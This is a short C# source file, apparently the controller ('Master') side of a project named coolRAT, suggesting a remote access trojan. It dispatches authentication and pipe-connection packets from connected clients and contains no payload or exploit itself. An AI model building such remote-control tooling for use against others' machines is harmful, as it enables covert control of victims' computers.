using coolRAT.Libs;
using coolRAT.Libs.PacketHandlers;
using coolRAT.Libs.PacketProcessors;
using coolRAT.Libs.Packets;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace coolRAT.Master
{
    public class Server_PacketHandler : PacketHandler
    {
        public Server_PacketHandler(TcpConnection connection) : base(connection)
        {
            Connection = connection;
        }

        public override void HandlePacket(string packet_raw)
        {
            Packet packet = Packet.Deserialize(packet_raw);
            if(packet.Type == "AuthenticateConnectionPacket")
            {
                AuthenticateConnectionPacket_PacketProcessor authenticateConnectionPacket_PacketProcessor
                    = new AuthenticateConnectionPacket_PacketProcessor(Connection, AuthenticateConnectionPacket.Deserialize(packet_raw));
                Client client = authenticateConnectionPacket_PacketProcessor.Process();
                MasterListener.ConnectedClients.Add(client.UniqueId, client);
                return;
            }
            if(packet.Type == "ConnectPipePacket")
            {
                ConnectPipePacket_PacketProcessor connectPipePacket_PacketProcessor
                    = new ConnectPipePacket_PacketProcessor(Connection, ConnectPipePacket.Deserialize(packet_raw), MasterListener.ConnectedClients);

                connectPipePacket_PacketProcessor.Process();
                return;
            }
        }
    }
}
